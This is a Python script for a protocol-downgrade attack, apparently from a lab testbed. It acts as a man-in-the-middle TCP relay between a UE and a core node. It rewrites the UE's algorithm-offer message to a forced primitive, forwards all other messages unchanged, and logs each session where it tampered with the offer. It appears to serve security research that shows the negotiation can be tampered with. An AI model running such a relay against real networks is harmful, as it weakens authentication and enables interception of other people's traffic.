#!/usr/bin/env python3
"""
downgrade_relay.py -- the attack. Run on VM-10. A transparent TCP relay that
sits between the UE and the REAL core: the UE is told to connect to VM-10's
IP (simulating an already-compromised path -- e.g. a rogue gNB or compromised
relay -- the network-level MITM positioning itself is OUT OF SCOPE for this
script, which starts from "attacker already intercepts this connection").

For every message it relays, it passes the bytes through UNCHANGED, with one
exception: the OFFER message (the UE's primitive preference list). For that
message only, it rewrites the payload to --force-alg before forwarding to
the real core -- i.e. it lies to the core about what the UE actually offered.

Every other message (SELECT, PKRSP, NONCE, SIG__) is forwarded byte-for-byte.
The relay never touches signatures, keys, or nonces -- it cannot forge a
signature for a primitive it doesn't have the UE's private key for. The
ENTIRE attack surface is the one OFFER message. This is deliberate: it
demonstrates that a downgrade succeeds purely through negotiation tampering,
not through breaking any cryptographic primitive.

Usage:
  python3 downgrade_relay.py --listen 192.168.0.27 --listen-port 6100 \
      --real-core 192.168.0.17 --real-port 6100 --force-alg Ed25519 \
      --log relay_log.csv
"""
import argparse, socket, struct, threading, json, csv, sys, time

MAGIC_LEN = 5

def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf

def recv_one_message(sock):
    """Read exactly one (magic, payload) frame, or None on clean close."""
    tag = recv_exact(sock, MAGIC_LEN)
    if tag is None:
        return None, None
    n_bytes = recv_exact(sock, 4)
    if n_bytes is None:
        return None, None
    (n,) = struct.unpack("!I", n_bytes)
    payload = recv_exact(sock, n) if n else b""
    return tag, payload

def send_one_message(sock, tag, payload):
    sock.sendall(tag + struct.pack("!I", len(payload)) + payload)

def relay_session(ue_conn, ue_addr, real_core_ip, real_core_port, force_alg, log_rows, log_lock):
    core_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    core_conn.connect((real_core_ip, real_core_port))
    print(f"[relay] {ue_addr}: connected to real core {real_core_ip}:{real_core_port}",
          file=sys.stderr)

    # --- the attack: intercept exactly the OFFER message, rewrite, forward ---
    tag, payload = recv_one_message(ue_conn)
    assert tag == b"OFFER", f"expected OFFER first, got {tag!r}"
    original_offer = json.loads(payload.decode())
    tampered_offer = [force_alg]
    print(f"[relay] *** TAMPERING *** {ue_addr}: UE offered {original_offer} "
          f"-> forwarding to core as {tampered_offer}", file=sys.stderr)
    send_one_message(core_conn, b"OFFER", json.dumps(tampered_offer).encode())
    with log_lock:
        log_rows.append({"ue": str(ue_addr), "original_offer": json.dumps(original_offer),
                          "tampered_offer": json.dumps(tampered_offer), "force_alg": force_alg})

    # --- everything else: pure byte-for-byte bidirectional passthrough ---
    def pump(src, dst, label):
        try:
            while True:
                tag, payload = recv_one_message(src)
                if tag is None:
                    break
                send_one_message(dst, tag, payload)
        except (ConnectionError, OSError):
            pass
        finally:
            try: dst.shutdown(socket.SHUT_WR)
            except OSError: pass

    t1 = threading.Thread(target=pump, args=(ue_conn, core_conn, "ue->core"))
    t2 = threading.Thread(target=pump, args=(core_conn, ue_conn, "core->ue"))
    t1.start(); t2.start()
    t1.join(); t2.join()
    print(f"[relay] {ue_addr}: session closed", file=sys.stderr)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--listen", required=True, help="VM-10's own IP to listen on")
    ap.add_argument("--listen-port", type=int, default=6100)
    ap.add_argument("--real-core", required=True, help="VM-02's real IP")
    ap.add_argument("--real-port", type=int, default=6100)
    ap.add_argument("--force-alg", required=True,
                     help="the primitive to force, e.g. Ed25519")
    ap.add_argument("--n-sessions", type=int, default=1,
                     help="how many UE connections to handle before exiting")
    ap.add_argument("--log", required=True)
    a = ap.parse_args()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((a.listen, a.listen_port))
    srv.listen(a.n_sessions)
    print(f"[relay] listening on {a.listen}:{a.listen_port}, "
          f"forcing alg={a.force_alg!r}, forwarding to real core "
          f"{a.real_core}:{a.real_port}, expecting {a.n_sessions} concurrent session(s)",
          file=sys.stderr)

    log_rows = []
    log_lock = threading.Lock()
    threads = []
    for i in range(a.n_sessions):
        ue_conn, ue_addr = srv.accept()
        print(f"[relay] accepted session {i+1}/{a.n_sessions} from {ue_addr}", file=sys.stderr)
        t = threading.Thread(target=relay_session,
                              args=(ue_conn, ue_addr, a.real_core, a.real_port,
                                    a.force_alg, log_rows, log_lock))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    with open(a.log, "w", newline="") as f:
        if log_rows:
            w = csv.DictWriter(f, fieldnames=list(log_rows[0].keys()))
            w.writeheader()
            w.writerows(log_rows)
    print(f"[relay] wrote {len(log_rows)} session records to {a.log}", file=sys.stderr)
    srv.close()


if __name__ == "__main__":
    main()
